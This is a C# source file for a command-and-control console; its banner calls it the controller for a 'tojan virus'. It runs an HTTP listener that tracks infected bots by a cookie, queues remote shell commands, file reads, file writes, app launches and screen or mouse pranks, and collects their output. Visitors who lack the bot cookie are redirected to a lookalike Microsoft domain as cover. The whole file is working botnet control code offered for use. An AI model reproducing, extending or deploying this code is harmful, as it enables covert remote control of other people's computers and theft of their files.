using System;
using System.Collections;
using System.Net;
using System.Threading;

namespace CCconsole
{
    class Slave
    {
        public const int expireTime = 10000;

        public string UUID; //= Guid.NewGuid().ToString()
        Queue cmdlist;
        DateTime lastping;
        DateTime lastoutput;
        string buff;

        public Slave(string uuid)
        {
            cmdlist = new Queue();
            UUID = uuid;
            buff = string.Empty;
            lastoutput = DateTime.Now;
        }

        public void update(string response)
        {
            lastping = DateTime.Now;
            buff = buff + response;
        }

        public string getResponses()
        {
            string tmp = buff;
            buff = string.Empty;
            return tmp;
        }

        public Boolean noCmds()
        {
            lastping = DateTime.Now;
            return cmdlist.Count == 0;
        }

        public string getcmd()
        {
            return (string) cmdlist.Dequeue();
        }

        public void assigncmd(string cmd)
        {
            cmdlist.Enqueue(cmd);
        }

        public Boolean isExpired()
        {
            return (DateTime.Now - lastping).TotalMilliseconds > expireTime;
        }

        public override string ToString()
        {
            int seconds = (DateTime.Now - lastping).Seconds;

            if (seconds < expireTime / 1000)
                return UUID + " (" + seconds + "s ago)";
            else
                return UUID + "( TIMED OUT )";
        }
    }

    class CCprog
    {
        public ArrayList slaves;
        HttpListener listener;

        public CCprog()
        {
            // init bots
            slaves = new ArrayList();

            // init the HTTP listener
            if (!HttpListener.IsSupported)
            {
                Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
                return;
            }
            listener = new HttpListener();
            listener.Prefixes.Add("http://*:8080/");
            //listener.Prefixes.Add("http://localhost:8080/");
            listener.Start();
            Console.WriteLine("listener started");
        }

        // This example requires the System and System.Net namespaces.
        public void run()
        {
            while (true)
            {
                // Note: The GetContext method blocks while waiting for a request. 
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;

                // figure out if a bot or not
                string uuid = request.Headers.Get("cookie");
                if (uuid == null)
                { // check if it's our bot. If not send fakepage
                    sendFake(request, response);
                    continue;
                }

                // identify the bot
                Slave slave = null;
                foreach (Slave s in slaves)
                    if (s.UUID.CompareTo(uuid) == 0)
                        { slave = s; break; }
                // add him in our memory if not existing
                if (slave == null)
                {
                    slave = new Slave(uuid);
                    slaves.Add(slave);
                }

                // Different behaviour depending on HTTP method
                switch (request.HttpMethod)
                {
                    case "GET":
                        handleGET(slave, request, response);
                        break;

                    case "POST":
                        handlePOST(slave, request, response);
                        break;

                    default:
                        Console.Error.WriteLine("UNKOWN HTTP METHOD: " + request.HttpMethod);
                        break;
                }

                sendOk(request, response);

                // go through the bots and clean the ones that timed out
                //cleanupSlaves();
            }
        }

        public void cleanupSlaves()
        {
            for (int i = slaves.Count - 1; i >= 0; i--)
                if (((Slave)slaves[i]).isExpired())
                    slaves.RemoveAt(i);
        }

        // get --> bot asks for cmds to execute
        private void handleGET(Slave slave, HttpListenerRequest request, HttpListenerResponse response)
        {
            if (slave.noCmds())
            {   // check if slave has commands to execute
                response.AppendHeader("cookie", "");
            }
            else
            {   // send command from buffer
                response.AppendHeader("cookie", slave.getcmd());
            }
        }

        // post --> bot has returned a result from a previous command
        private void handlePOST(Slave slave, HttpListenerRequest request, HttpListenerResponse response)
        {
            if (!request.HasEntityBody)
                return;

            using (System.IO.Stream body = request.InputStream) // here we have data
            {
                using (System.IO.StreamReader reader = new System.IO.StreamReader(body, request.ContentEncoding))
                {
                    slave.update(reader.ReadToEnd());
                }
            }
        }

        private void sendOk(HttpListenerRequest request, HttpListenerResponse response)
        {
            // Construct a response.
            string responseString = "<HTML><BODY>moved</BODY></HTML>";
            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
            // Get a response stream and write the response to it.
            response.ContentLength64 = buffer.Length;

            // send back
            System.IO.Stream output = response.OutputStream;
            output.Write(buffer, 0, buffer.Length);
            output.Close();
        }

        private void sendFake(HttpListenerRequest request, HttpListenerResponse response)
        {
            // Construct a response.
            string responseString = "<HTML><BODY>moved</BODY></HTML>";
            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
            // Get a response stream and write the response to it.
            response.ContentLength64 = buffer.Length;

            response.Redirect("http://choice.microsoft.com.nstac.net/");

            // send back
            System.IO.Stream output = response.OutputStream;
            output.Write(buffer, 0, buffer.Length);
            output.Close();
        }
    }

    class CCterm
    {
        CCprog program;
        Slave crtSlave;

        public CCterm(CCprog program)
        {
            this.program = program;
            crtSlave = null;
        }

        public void run()
        {
            Console.WriteLine("Welcome to the c&c console for the C.A.L tojan virus. Type help for help.");
            while (true)
            {
                Console.Write(">");

                string cmd = Console.ReadLine();
                string[] elements = cmd.Split(' ');

                // make sure bot is still up
                if (crtSlave != null)
                    if (crtSlave.isExpired())
                    {
                        crtSlave = null;
                        Console.WriteLine("WARNING: selected bot: timed out");
                    }
                
                // decide
                switch (elements[0])
                {
                    case "list":
                        int i = 0;
                        foreach (Slave s in program.slaves)
                        {
                            Console.WriteLine(i++ + ": " + s);
                        }
                        // clean up timed out bots
                        program.cleanupSlaves();

                        break;

                    case "select":
                        int index = int.Parse(elements[1]);
                        crtSlave = (Slave)program.slaves[index];
                        Console.WriteLine("Selected bot " + index);
                        break;

                    case "which":
                        if (crtSlave == null)
                            Console.WriteLine("No bot selected");
                        else
                            Console.WriteLine(crtSlave);
                        break;

                    case "output":
                        if (crtSlave != null)
                            Console.Out.WriteLine(crtSlave.getResponses());
                        else
                            Console.Write("not bot selected");
                        break;

                    case "quit":
                        System.Environment.Exit(0);
                        break;

                    case "cmd":
                    case "read":
                    case "update":
                    case "run":
                    case "rotate":
                    case "invert":
                    case "exit":
                    case "message":
                        if (crtSlave != null)
                            crtSlave.assigncmd(cmd);
                        else
                            Console.Write("no bot selected");
                        break;

                    case "help":
                        Console.WriteLine(  "list - list active bots\n" +
                                            "select X - select a bot from the list\n" +
                                            "which - show selected bot\n" +
                                            "output - show the output of previous commands (if received)\n" +
                                            "quit - shutdown the C&C server\n" +
                                            "\n" +
                                            "BOT ACTIONS:\n"+
                                            "cmd <cmd command> - runs a shell command\n" +
                                            "read <file> - prints the contents of a file\n" +
                                            "update <file> <text> - appends text to the end of the file\n" +
                                            "run <app> - runs an app (eg. chrome)\n" +
                                            "rotate {0, 90, 180, 270} - rotate bot's screen\n" +
                                            "invert {0,1} - invert bot's mouse movement\n" +
                                            "exit - shutdown bot\n" + 
                                            "message <text> - open a textbox with said text");
                        break;

                    default:
                        Console.Out.WriteLine("invalid command");
                        break;
                }

                Console.WriteLine();
            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            // start the http listener on a different thread
            CCprog cc = new CCprog();
            Thread t = new Thread(cc.run);
            t.Start();

            System.Threading.Thread.Sleep(1000);
            // start our console on this thread
            CCterm cct = new CCterm(cc);
            cct.run();
        }
    }
}
